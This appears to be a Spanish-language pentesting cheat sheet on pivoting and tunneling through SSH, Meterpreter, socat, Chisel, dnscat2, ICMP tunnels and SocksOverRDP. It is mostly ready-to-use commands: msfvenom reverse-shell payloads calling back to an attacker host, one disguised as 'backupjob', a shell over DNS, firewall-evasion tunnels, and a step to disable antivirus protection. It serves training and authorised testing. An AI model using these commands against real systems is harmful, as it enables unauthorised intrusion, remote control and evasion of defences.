# Pivoting, Tunneling y Port Forwarding

---

## ⚠️ Nota sobre Windows

En Windows, los pings no recibirán respuesta porque el firewall / Defender los bloquea por defecto. Usa escaneos TCP (`-sT`) con Nmap o herramientas que no dependan de ICMP.

---

## 1. SSH Port Forwarding

### Reenvío local (Local Port Forwarding)

Redirige un puerto local de tu máquina atacante hacia un servicio en la máquina remota.

```bash
# Escenario: MySQL (3306) solo accesible desde el pivot
ssh -L 1234:localhost:3306 usuario@pivot_host

# Múltiples puertos en un solo comando
ssh -L 1234:localhost:3306 -L 8080:localhost:80 usuario@pivot_host
```

Tras ejecutarlo, conectas a `127.0.0.1:1234` y el tráfico llega al `3306` del pivot.

---

### Reenvío dinámico (SOCKS Proxy)

Convierte el pivot en un proxy SOCKS para enrutar tráfico hacia redes internas.

```bash
# Abrir proxy SOCKS en puerto local 9050
ssh -D 9050 usuario@pivot_host
```

Configura `/etc/proxychains.conf`:
```
socks4  127.0.0.1 9050
```

Úsalo con cualquier herramienta:
```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains msfconsole
```

---

### Reenvío remoto / inverso (Remote Port Forwarding)

Útil cuando el objetivo no puede conectarse directamente a tu máquina atacante. El pivot escucha conexiones y las reenvía hacia tu listener.

```bash
# El pivot escucha en 8080 y reenvía al listener en tu máquina en 8000
ssh -R <IP_interna_pivot>:8080:0.0.0.0:8000 usuario@pivot_host -vN
```

**Flujo típico con Metasploit:**

1. Generar payload apuntando al pivot:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<IP_interna_pivot> LPORT=8080 \
  -f exe -o payload.exe
```

2. Iniciar listener en tu máquina:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

3. Subir el payload al pivot y ejecutarlo en el objetivo Windows.

---

## 2. Meterpreter Tunneling

### Obtener sesión Meterpreter en el pivot

```bash
# Generar payload Linux para el pivot
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<tu_IP> LPORT=8080 \
  -f elf -o backupjob

# Iniciar handler
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

```bash
# Ejecutar en el pivot
chmod +x backupjob && ./backupjob
```

---

### Ping Sweep desde Meterpreter

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Alternativas sin Meterpreter:

```bash
# En pivot Linux
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# En pivot Windows (CMD)
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# En pivot Windows (PowerShell)
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

### SOCKS Proxy con Metasploit

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Luego agrega rutas con autoroute:
```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

O desde la sesión Meterpreter:
```
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p   # Ver rutas activas
```

---

### Port Forward con portfwd (Meterpreter)

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# Ahora conectas a tu localhost:3300 y llegas al RDP del objetivo
```

```bash
xfreerdp /v:localhost:3300 /u:usuario /p:contraseña
```

**Reverse port forward:**
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L <tu_IP>
```

---

## 3. Socat

Herramienta de relay bidireccional sin necesidad de SSH.

### Reverse Shell a través de Socat

```bash
# En el pivot: escuchar en 8080, redirigir al atacante en puerto 80
socat TCP4-LISTEN:8080,fork TCP4:<IP_atacante>:80
```

Generar payload apuntando al pivot:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<IP_pivot> LPORT=8080 \
  -f exe -o payload.exe
```

Listener en el atacante en puerto 80.

---

### Bind Shell a través de Socat

```bash
# En el pivot: escuchar en 8080, conectar al bind shell del objetivo en 8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

```bash
# Payload bind TCP para el objetivo Windows
msfvenom -p windows/x64/meterpreter/bind_tcp \
  -f exe -o payload.exe LPORT=8443
```

Conectar desde Metasploit:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <IP_pivot>
set LPORT 8080
run
```

---

## 4. Plink.exe (SSH para Windows)

Cuando el host pivote es Windows y tienes PuTTY disponible.

```cmd
plink -ssh -D 9050 usuario@pivot_host
```

Luego usa **Proxifier** en Windows para enrutar el tráfico a través de `127.0.0.1:9050`.

---

## 5. Sshuttle

Automatiza las reglas de `iptables` sin necesitar configurar proxychains.

```bash
sudo apt-get install sshuttle

# Enrutar toda la red interna a través del pivot
sudo sshuttle -r usuario@pivot_host 172.16.5.0/23 -v
```

Tras ejecutarlo, puedes usar herramientas directamente sin proxychains:
```bash
nmap -v -sV -p3389 172.16.5.19 -A -Pn
xfreerdp /v:172.16.5.19 /u:usuario /p:contraseña
```

---

## 6. Chisel (SOCKS5 sobre HTTP/SSH)

Útil cuando el firewall bloquea conexiones directas. Transporta SOCKS5 sobre HTTP con cifrado SSH.

### Modo normal (cliente conecta al servidor en el pivot)

```bash
# En el pivot
./chisel server -v -p 1234 --socks5

# En el atacante
./chisel client -v <IP_pivot>:1234 socks
```

Configura `/etc/proxychains.conf`:
```
socks5 127.0.0.1 1080
```

---

### Modo inverso (útil con firewall restrictivo)

```bash
# En el atacante
sudo ./chisel server --reverse -v -p 1234 --socks5

# En el pivot
./chisel client -v <IP_atacante>:1234 R:socks
```

> **Tip:** Si hay errores de compatibilidad, prueba con una versión anterior de Chisel desde [releases](https://github.com/jpillora/chisel/releases).

```bash
proxychains xfreerdp /v:172.16.5.19 /u:usuario /p:contraseña
```

---

## 7. Rpivot (SOCKS inverso vía HTTP)

Útil en entornos con proxy NTLM corporativo.

```bash
# En el atacante (servidor)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transferir al pivot y ejecutar
python2.7 client.py --server-ip <IP_atacante> --server-port 9999
```

Con proxy NTLM:
```bash
python client.py --server-ip <IP_web_objetivo> --server-port 8080 \
  --ntlm-proxy-ip <IP_proxy> --ntlm-proxy-port 8081 \
  --domain <dominio> --username <usuario> --password <contraseña>
```

---

## 8. Netsh (Port Forwarding en Windows)

Útil cuando el pivote es una estación de trabajo Windows.

```cmd
# Redirigir puerto 8080 local hacia RDP en host interno
netsh.exe interface portproxy add v4tov4 \
  listenport=8080 listenaddress=<IP_pivot> \
  connectport=3389 connectaddress=172.16.5.25

# Verificar la regla
netsh.exe interface portproxy show v4tov4
```

---

## 9. DNS Tunneling con Dnscat2

Encapsula tráfico en consultas DNS. Muy útil para evadir firewalls que permiten DNS externo.

```bash
# Configurar el servidor en el atacante
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && sudo bundle install

# Iniciar servidor
sudo ruby dnscat2.rb --dns host=<tu_IP>,port=53,domain=example.local --no-cache
```

En el objetivo Windows (PowerShell):
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <tu_IP> -Domain example.local \
  -PreSharedSecret <secreto_del_servidor> -Exec cmd
```

Interactuar con la sesión:
```
dnscat2> window -i 1
```

---

## 10. ICMP Tunneling con ptunnel-ng

Encapsula SSH dentro de paquetes ICMP (ping). Útil cuando solo hay tráfico ICMP permitido.

```bash
# En el pivot (servidor)
sudo ./ptunnel-ng -r<IP_pivot> -R22

# En el atacante (cliente)
sudo ./ptunnel-ng -p<IP_pivot> -l2222 -r<IP_pivot> -R22

# Conectar SSH a través del túnel
ssh -p2222 -l usuario 127.0.0.1

# Opcional: reenvío dinámico sobre el túnel ICMP
ssh -D 9050 -p2222 -l usuario 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## 11. SocksOverRDP (Double Pivot en Windows)

Para cuando estás limitado a una red Windows con RDP. Usa canales virtuales DVC del propio protocolo RDP.

**Herramientas necesarias:**
- [SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases)
- [Proxifier Portable](https://www.proxifier.com/download/#win-tab)

```cmd
# En el objetivo Windows (desactivar protección en tiempo real primero)
regsvr32.exe SocksOverRDP-Plugin.dll

# Conectar por RDP al siguiente salto (el plugin intercepta la sesión)
mstsc.exe -> conectar a 172.16.5.19

# En ese segundo Windows, ejecutar el servidor
SocksOverRDP-Server.exe

# Verificar listener en 127.0.0.1:1080
netstat -antb | findstr 1080
```

Configura Proxifier para usar `127.0.0.1:1080` y luego abre `mstsc.exe` — el tráfico pivotará automáticamente.

> **Rendimiento:** Si la sesión RDP va lenta, en la pestaña *Experience* selecciona *Modem (56 kbps)*.

---

## Referencia rápida de comandos

| Técnica | Comando base |
|---|---|
| SSH Local Fwd | `ssh -L puerto_local:host_remoto:puerto_remoto user@pivot` |
| SSH Dynamic (SOCKS) | `ssh -D 9050 user@pivot` |
| SSH Remote Fwd | `ssh -R IP_pivot:8080:0.0.0.0:8000 user@pivot -vN` |
| Chisel server | `./chisel server -v -p 1234 --socks5` |
| Chisel client | `./chisel client -v IP:1234 socks` |
| Sshuttle | `sshuttle -r user@pivot 172.16.5.0/23` |
| Plink (Windows) | `plink -ssh -D 9050 user@pivot` |
| Netsh fwd | `netsh interface portproxy add v4tov4 ...` |
| Socat relay | `socat TCP4-LISTEN:8080,fork TCP4:IP:puerto` |
